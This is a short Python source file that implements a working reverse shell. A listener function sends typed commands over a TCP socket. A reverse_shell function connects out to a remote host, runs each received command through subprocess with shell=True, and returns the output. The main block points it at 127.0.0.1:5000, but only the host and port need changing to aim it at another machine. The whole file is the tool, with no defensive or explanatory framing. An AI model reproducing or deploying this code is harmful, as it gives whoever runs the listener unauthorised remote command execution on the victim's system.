import os
import socket
import subprocess
import select


def listener(local_host: str, local_port: int, buffer_size: int = 1024, carriage_return: str = '\n') -> None:
    """
    Works with netcat and reverse_shell().
    Carriage return is an option because different OS may expect different values.
    Unix typically '\n'. Windows '\r\n'.
    """

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((local_host, local_port))
        s.listen(5)
        print(f"Listening.")

        client_socket, client_address = s.accept()
        print(f"Connection: {client_address[0]}:{client_address[1]} ")

        while True:
            command = input('[NetworkPortal]-$ ')
            if not command.strip():
                # empty command
                continue

            client_socket.send(f"{command}{carriage_return}".encode())
            if command.lower() == "np exit":
                # if the command is 'np exit', just break out of the loop
                break

            # Confirm data is being sent with a timeout
            ready = select.select([client_socket], [], [], 5)
            if ready[0]:
                output = client_socket.recv(buffer_size).decode()
                print(output)

        s.close()

    except socket.error:
        print(f'[-] Problem encountered: {socket.error} ')
        exit()


def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -> None:
    """
    Works with listener().
    """

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((remote_host, remote_port))

    while True:
        # receive the command from the server
        command = s.recv(buffer_size).decode().split()

        if command[0].lower() == "exit":
            # if the command is exit, just break out of the loop
            break

        try:
            os_call = subprocess.run(command, shell=True, capture_output=True)

            if os_call.returncode == 0:
                s.send(os_call.stdout)
            else:
                s.send(os_call.stderr)
        except FileNotFoundError:
            s.send(b"Error occurred.")

    # close client connection
    s.close()


if __name__ == '__main__':
    # listener(local_host='127.0.0.1', local_port=5000)
    reverse_shell(remote_host='127.0.0.1', remote_port=5000)
